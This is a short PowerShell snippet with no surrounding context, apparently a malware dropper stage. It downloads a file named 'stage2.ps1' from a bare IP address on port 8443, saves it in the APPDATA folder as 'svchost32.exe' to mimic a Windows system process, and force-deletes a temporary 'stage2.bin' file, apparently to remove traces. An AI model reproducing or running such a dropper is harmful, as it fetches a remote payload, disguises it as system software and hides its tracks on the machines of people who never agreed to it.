Invoke-WebRequest -Uri 'https://192.0.2.8:8443/stage2.ps1' -OutFile "$env:APPDATA\svchost32.exe" -UseBasicParsing
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
